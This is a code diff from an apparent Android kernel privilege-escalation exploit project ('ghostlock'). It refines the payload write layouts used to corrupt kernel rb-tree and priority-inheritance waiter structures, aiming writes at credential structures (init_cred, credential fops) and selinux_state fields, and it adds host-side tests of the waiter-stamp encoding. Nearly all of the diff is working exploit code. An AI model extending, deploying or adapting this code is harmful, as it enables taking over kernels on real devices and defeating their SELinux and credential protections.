@@ -83,7 +83,7 @@ namespace ghostlock::memory {
     PayloadWriteLayout payload_write_layout(
         const WriteRequest *request, uintptr_t page_base,
         uintptr_t default_fops, uintptr_t credential_fops,
-        uintptr_t init_cred_alias) {
+        uintptr_t init_cred_alias, uintptr_t zero_value_override) {
         PayloadWriteLayout layout = {
             .fops = default_fops,
         };
@@ -92,7 +92,8 @@ namespace ghostlock::memory {
         if (request->preserve_child) {
             layout.right = request->mode == WriteMode::Credential
                                ? init_cred_alias
-                               : page_base + 0x100;
+                               : (zero_value_override ? zero_value_override
+                                                      : page_base + 0x100);
             /* the erase stores at rb_left, and the collateral re-parents through
              * this same value -- see waiter_tree_stamp */
             layout.left = request->target;
@@ -133,13 +134,18 @@ namespace ghostlock::memory {
     }
 
     int32_t payload_write_layout_accepts_page(
-        const WriteRequest *request, const PayloadWriteLayout *layout) {
+        const WriteRequest *request, const PayloadWriteLayout *layout,
+        uint32_t initialized_offset) {
         if (!payload_write_layout_matches_request(request, layout)) return 0;
-        /* W1 stores its page-derived value across selinux_state fields. An even
-     * byte 2 clears `initialized` and breaks every subsequent SID lookup. */
-        if (request->mode == WriteMode::Zero && request->preserve_child &&
-            ((layout->right >> 16) & 1) == 0)
-            return 0;
+        /* W1 stores its value across selinux_state fields. The kernel tests
+         * bit 0 of `initialized` (a `_Bool` load compiled as `ldarb; tbnz #0`),
+         * so an even byte reads as false and breaks every subsequent SID
+         * lookup. Which byte it is depends on the family. */
+        if (request->mode == WriteMode::Zero && request->preserve_child) {
+            if (initialized_offset >= sizeof(uintptr_t)) return 0; /* fail closed */
+            const uint32_t shift = 8U * initialized_offset;
+            if (((layout->right >> shift) & 0x1U) == 0) return 0;
+        }
         return 1;
     }
 
@@ -191,7 +197,7 @@ namespace ghostlock::memory {
                 load64(current.data(), 0x20) != 0 ||
                 load64(current.data(), 0x28) != vectors[i].expected_left ||
                 !payload_write_layout_matches_request(&request, &layout) ||
-                !payload_write_layout_accepts_page(&request, &layout))
+                !payload_write_layout_accepts_page(&request, &layout, 2))
                 return 0;
         }
         /* The invariant the vehicle rests on: a zero write's node is CHILDLESS and
@@ -213,7 +219,7 @@ namespace ghostlock::memory {
             0xffffff8000124000ULL, WriteMode::Zero, false);
         PayloadWriteLayout rejected = payload_write_layout(
             &w1, 0xffffff8800200000ULL, 0x1111, 0x2222, init_cred);
-        if (payload_write_layout_accepts_page(&w1, &rejected)) return 0;
+        if (payload_write_layout_accepts_page(&w1, &rejected, 2)) return 0;
         rejected.right = 0;
         if (payload_write_layout_matches_request(&w1, &rejected)) return 0;
 
@@ -318,6 +324,78 @@ namespace ghostlock::memory {
             std::array<std::byte, kWaiterBytes - 1> too_small{};
             if (encode_waiter_words(too_small, 0, pointer_words)) return 0;
             if (encode_waiter_words(window, 9, pointer_words)) return 0;
+        }
+        /* The anchored multicast stamp. Its strip starts at waiter_off (0x30 on
+         * the 246 profile) and is the same eleven words, placed by the same
+         * waiter_words()/encode_waiter_words() pair the route calls -- that
+         * call is the only part of the anchored branch host-testable here:
+         * acquire_lock_word() and slide_init_task() are Android-only. Fit:
+         * 0x30 + 0x58 = 0x88 <= 0x108 (264). */
+        {
+            constexpr std::uintptr_t mcast_target = 0xffffff8000129000ULL;
+            constexpr std::uintptr_t mcast_task = 0xffffff802ac00000ULL;
+            constexpr std::uintptr_t mcast_lock = 0xffffff802ec7bd8ULL;
+            constexpr std::size_t mcast_waiter_off = 0x30;
+            constexpr std::size_t mcast_buffer = 264;
+            const WriteRequest mcast_request = WriteRequest::make(
+                mcast_target, WriteMode::Zero, /*leaf=*/false);
+            const PayloadWriteLayout mcast_layout = payload_write_layout(
+                &mcast_request, page, 0x1111, 0x2222, init_cred);
+            const WaiterWords mcast_words =
+                waiter_words(mcast_layout, mcast_task, mcast_lock, 140);
+            std::array<std::byte, mcast_buffer> mcast_stamp{};
+            /* The route writes the family word at offset 8 after the encode;
+             * a nonzero marker there pins that the strip leaves it alone. */
+            mcast_stamp[8] = std::byte{0x5a};
+            if (!encode_waiter_words(mcast_stamp, mcast_waiter_off, mcast_words))
+                return 0;
+            const auto *mcast_bytes =
+                reinterpret_cast<const unsigned char *>(mcast_stamp.data());
+            /* Tree triple: {pc = page + 0x100, right = 0, left = target} -- the
+             * erase stores pc at rb_left and re-parents through it. */
+            if (load64(mcast_bytes, mcast_waiter_off + 0x00) != page + 0x100 ||
+                load64(mcast_bytes, mcast_waiter_off + 0x08) != 0 ||
+                load64(mcast_bytes, mcast_waiter_off + 0x10) != mcast_target)
+                return 0;
+            /* PI side parks; task/lock/prio/deadline/ww_ctx are the page-free
+             * words (init_task alias, anchor slot, family prio, two zeroes). */
+            if (load64(mcast_bytes, mcast_waiter_off + 0x18) != 0 ||
+                load64(mcast_bytes, mcast_waiter_off + 0x20) != 0 ||
+                load64(mcast_bytes, mcast_waiter_off + 0x28) != 0)
+                return 0;
+            if (load64(mcast_bytes, mcast_waiter_off + 0x30) != mcast_task ||
+                load64(mcast_bytes, mcast_waiter_off + 0x38) != mcast_lock ||
+                load64(mcast_bytes, mcast_waiter_off + 0x40) != 140 ||
+                load64(mcast_bytes, mcast_waiter_off + 0x48) != 0 ||
+                load64(mcast_bytes, mcast_waiter_off + 0x50) != 0)
+                return 0;
+            /* Nothing outside the strip moved. */
+            if (mcast_stamp[8] != std::byte{0x5a}) return 0;
+            for (std::size_t i = 0; i < mcast_waiter_off; i++) {
+                if (i != 8 && mcast_stamp[i] != std::byte{0}) return 0;
+            }
+            for (std::size_t i = mcast_waiter_off + kWaiterBytes; i < mcast_buffer; i++) {
+                if (mcast_stamp[i] != std::byte{0}) return 0;
+            }
+            /* An exact fit is accepted; one byte less is refused without
+             * writing. */
+            std::array<std::byte, mcast_buffer> exact{};
+            if (!encode_waiter_words(exact, mcast_buffer - kWaiterBytes, mcast_words))
+                return 0;
+            std::array<std::byte, mcast_buffer> overflow{};
+            if (encode_waiter_words(overflow, mcast_buffer - kWaiterBytes + 1,
+                                    mcast_words))
+                return 0;
+            for (const std::byte b : overflow) {
+                if (b != std::byte{0}) return 0;
+            }
+            /* An absent geometry decodes as a negative waiter_off; the size_t
+             * cast must be refused, not wrapped into an in-bounds write. */
+            std::array<std::byte, mcast_buffer> negative{};
+            if (encode_waiter_words(
+                    negative, static_cast<std::size_t>(static_cast<std::int32_t>(-1)),
+                    mcast_words))
+                return 0;
         }
         /* Multicast geometry that would run past the supplied span is rejected
      * instead of written out of bounds. */
